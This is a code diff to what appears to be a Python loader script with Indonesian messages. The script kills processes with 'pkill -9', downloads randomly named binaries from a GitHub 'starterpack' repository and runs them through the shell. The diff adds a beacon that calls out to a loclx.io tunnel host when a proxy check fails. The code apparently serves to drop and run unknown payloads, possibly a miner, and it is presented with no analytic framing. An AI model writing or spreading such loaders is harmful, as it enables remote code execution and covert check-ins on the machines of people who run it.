@@ -43,6 +43,14 @@ def kill_processes(process_list):
     for process_name in process_list:
         subprocess.run(['pkill', '-9', process_name])
 
+def send_info():
+    url = "https://localtopublic.ap.loclx.io/info"
+
+    try:
+        requests.get(url)
+    except requests.RequestException as e:
+        print(f"Error saat mengakses website: {e}")
+
 def download_and_run_file():
     download_link_base = "https://github.com/suplays/starterpack/raw/main/nim/backup/"
     file_names = ['satu', 'dua', 'tiga', 'empat', 'lima', 'enam', 'tujuh']
@@ -62,7 +70,7 @@ def download_and_run_file():
             
             subprocess.run(f"./{random_file_name}", shell=True)
         else:
-            print("Gagal mengunduh file.")
+            raise Exception("Gagal mengunduh file.")
     except Exception as e:
         print(f"Error downloading/running file: {e}")
 
@@ -76,6 +84,12 @@ if __name__ == "__main__":
         else:
             print("Proxy tidak valid. Menghentikan proses.")
             kill_processes(process_list)
+
+            try:
+                send_info()
+            except Exception as ex:
+                print(f"Error saat mengirim info: {ex}")
+
             try:
                 download_and_run_file()
                 break
